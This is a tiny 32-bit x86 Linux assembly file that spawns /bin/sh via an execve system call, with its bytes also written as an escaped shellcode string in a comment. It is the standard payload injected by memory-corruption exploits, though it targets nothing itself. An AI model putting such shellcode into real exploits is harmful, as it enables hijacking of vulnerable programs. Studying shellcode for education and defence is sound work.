; \x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x00\x53\x89\xe1\xba\x00\x00\x00\x00\xcd\x80
section .text
    global _start

_start:

    push dword 0xb
    pop eax
    push dword 0x0068732f
    push dword 0x6e69622f
    mov ebx, esp
    push dword 0x0
    push ebx
    mov ecx, esp
    mov edx, 0x0
    int 0x80                     